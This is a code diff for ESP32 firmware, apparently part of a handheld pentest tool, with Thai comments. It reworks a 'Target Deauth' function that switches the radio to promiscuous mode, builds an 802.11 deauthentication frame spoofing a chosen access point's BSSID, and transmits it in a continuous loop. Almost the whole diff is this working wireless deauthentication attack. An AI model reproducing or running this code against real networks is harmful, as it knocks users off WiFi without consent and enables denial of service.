@@ -745,41 +745,32 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     resetGlobalState();
     cleanlyStopWebUiForWiFiFeature();
 
-    // ---------- 1. ล้าง WiFi เก่า แล้วตั้งโหมด STA + promiscuous ----------
+    // ล้าง WiFi แล้วตั้ง STA + promiscuous
     WiFi.disconnect(true);
     WiFi.mode(WIFI_OFF);
     delay(100);
     
-    // ตั้งค่าเริ่มต้นใหม่ (เหมือน tryMonitorMode)
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_wifi_init(&cfg);
     esp_wifi_set_mode(WIFI_MODE_STA);
     esp_wifi_set_promiscuous(true);
     
-    // ตั้ง channel (ลองซ้ำถ้าไม่สำเร็จ)
-    esp_err_t err = ESP_FAIL;
-    for (int retry = 0; retry < 3; retry++) {
-        err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-        if (err == ESP_OK) break;
+    // เปลี่ยน channel (retry)
+    for (int i = 0; i < 3; i++) {
+        if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) break;
         delay(10);
     }
-    if (err != ESP_OK) {
-        // fallback: ถ้าเปลี่ยนไม่ได้ (น้อยมาก) ใช้ AP mode
-        WiFi.mode(WIFI_AP);
-        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    }
-    esp_wifi_set_max_tx_power(78);  // กำลังส่งสูงสุด
-
-    // ---------- 2. เตรียม deauth frame (ยิงจาก STA interface) ----------
+    
+    // เตรียม deauth frame (ไม่ต้องใช้ buildOptimizedDeauthFrame)
     uint8_t bssid[6];
     sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+    memcpy(&deauth_frame[4], _default_target, 6);
+    memcpy(&deauth_frame[10], bssid, 6);
+    memcpy(&deauth_frame[16], bssid, 6);
 
-    // สร้าง deauth frame แบบเดียวกับ stationDeauth (ใช้ buildOptimizedDeauthFrame)
-    uint8_t deauth_frame[26];
-    buildOptimizedDeauthFrame(deauth_frame, _default_target, bssid, bssid, 0x07, false);
-
-    // ---------- 3. วนส่ง deauth ----------
+    // loop โจมตีเหมือนเดิม...
     const uint16_t UPDATE_INTERVAL_MS = 2000;
     uint32_t lastUpdateTime = millis();
     uint32_t frameCount = 0;
@@ -794,7 +785,6 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     while (attackActive) {
         if (needsRedraw) {
             drawMainBorderWithTitle("Target Deauth");
-            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
             padprintln("");
             padprintln("AP: " + tssid);
             padprintln("Channel: " + String(channel));
@@ -803,19 +793,15 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             needsRedraw = false;
         }
 
-        // ส่งผ่าน STA interface (เหมือน stationDeauth)
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
-        frameCount++;
+        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        frameCount += 3;
 
-        uint32_t currentTime = millis();
-        if (currentTime - lastUpdateTime >= UPDATE_INTERVAL_MS) {
-            uint16_t statusX = tftWidth * 0.05;
-            uint16_t statusY = tftHeight - (tftHeight * 0.08);
-            tft.setCursor(statusX, statusY);
-            float fps = (frameCount * 1000.0) / (currentTime - lastUpdateTime);
+        if (millis() - lastUpdateTime >= UPDATE_INTERVAL_MS) {
+            float fps = (frameCount * 1000.0) / (millis() - lastUpdateTime);
+            tft.setCursor(tftWidth * 0.05, tftHeight - (tftHeight * 0.08));
             tft.print("Frames: " + String((int)fps) + "/s   ");
             frameCount = 0;
-            lastUpdateTime = currentTime;
+            lastUpdateTime = millis();
         }
 
         if (check(SelPress) || EscPress) {
@@ -823,20 +809,15 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             displayTextLine("Deauth Paused");
             delay(500);
             while (!check(SelPress)) {
-                vTaskDelay(10 / portTICK_PERIOD_MS);
-                if (check(EscPress)) {
-                    attackActive = false;
-                    break;
-                }
+                delay(10);
+                if (check(EscPress)) { attackActive = false; break; }
             }
             needsRedraw = true;
         }
     }
 
-    // คืนค่าปกติ
     esp_wifi_set_promiscuous(false);
     WiFi.mode(WIFI_OFF);
-    wifiDisconnect();  // หรือ wifi_atk_unsetWifi() ถ้าต้องการ
     returnToMenu = true;
 }
 
